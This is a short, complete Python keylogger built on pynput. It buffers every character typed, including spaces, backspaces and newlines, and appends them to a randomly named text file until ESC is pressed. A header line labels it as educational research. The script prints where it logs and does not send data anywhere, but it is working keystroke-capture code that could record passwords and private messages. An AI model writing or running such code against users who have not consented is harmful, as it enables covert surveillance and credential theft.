import random
import string
import os
from pynput import keyboard

# Generate a random filename
def generate_random_filename(extension=".txt", length=8):
    letters = string.ascii_letters
    random_filename = ''.join(random.choice(letters) for _ in range(length)) + extension
    return random_filename

# Define the log file path
log_file_path = generate_random_filename()

# Store keystrokes in memory and write periodically
keystroke_buffer = ""

def on_press(key):
    global keystroke_buffer
    
    try:
        if hasattr(key, 'char') and key.char:
            keystroke_buffer += key.char
        elif key == keyboard.Key.space:
            keystroke_buffer += ' '
        elif key == keyboard.Key.backspace:
            # Remove last character from buffer
            keystroke_buffer = keystroke_buffer[:-1]
        elif key == keyboard.Key.enter:
            keystroke_buffer += '\n'
            
        # Write to file every 10 characters to reduce disk I/O
        if len(keystroke_buffer) >= 10:
            with open(log_file_path, 'a', encoding='utf-8') as log_file:
                log_file.write(keystroke_buffer)
            keystroke_buffer = ""
            
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Write remaining buffer before exiting
        if keystroke_buffer:
            with open(log_file_path, 'a', encoding='utf-8') as log_file:
                log_file.write(keystroke_buffer)
        print(f"Exiting... Log file: {log_file_path}")
        return False

# Write initial message
with open(log_file_path, 'w', encoding='utf-8') as log_file:
    log_file.write("Educational Keylogger Research - Keystroke Log\n")
    log_file.write("=" * 50 + "\n")

print(f"Logging keystrokes to: {log_file_path}")
print("Press ESC to stop logging...")

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()